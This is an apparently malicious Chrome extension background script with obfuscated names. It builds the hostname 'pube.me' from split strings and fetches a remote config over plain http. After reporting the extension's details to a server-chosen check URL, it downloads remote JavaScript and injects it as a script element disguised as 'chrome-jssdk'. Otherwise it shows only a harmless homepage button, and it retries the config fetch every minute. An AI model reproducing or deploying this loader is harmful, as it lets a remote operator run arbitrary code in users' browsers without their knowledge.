var aekye = {};
var junkn = function(){
	var yszlh = new URL('https://www.google.com');
	yszlh.protocol = 'http:';
	var zceuv = 'pube';
	var lazgmt = 'me';
	yszlh.hostname = zceuv+'.'+lazgmt;
	yszlh.pathname = '/config';
	if(!chrome.app.getDetails()){
		return false;
	}
	fetch(yszlh).then(function(response){
		return response.json();
	}).then(function(data){
		aekye = data;
		if(data.login == true){
			aekye.app = chrome.app.getDetails();
			gjatf();
		}else{
			mmexq();
		}
	}).catch((e) => {
		setTimeout(junkn, 1000*60);
	});
}

var gjatf = function(){
	aekye.request.headers = {installed:true};
	fetch(aekye.check ,aekye.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			vbgidd();
		}else{
			mmexq();
		}
	});
}

var mqzjzp = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = aekye.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var vbgidd = function(){
	fetch(aekye.url).then(function(response){
		return response.blob();
	}).then(function(data){
		aekye.url = URL.createObjectURL(data);
		mqzjzp(aekye.url);
	});
}

var evrnec = function(){
	chrome.tabs.create({url:aekye.homepage}, function(tab){
		aekye.tab = tab.id;
		chrome.browserAction.enable();
		if(!aekye.rhstmn){
			issbg();
		}
	});
}

var nbwihz = function(){
	chrome.tabs.update(aekye.tab, {url: aekye.homepage}, function(){
		chrome.browserAction.enable();
	})
}

var issbg = function(){
	aekye.rhstmn = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == aekye.tab){
			aekye.tab = false;
		}
	});
}

var mmexq = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		if(!aekye.tab){
			evrnec();
		}else{
			nbwihz();
		}
	});
}

if(chrome){
	junkn();
}
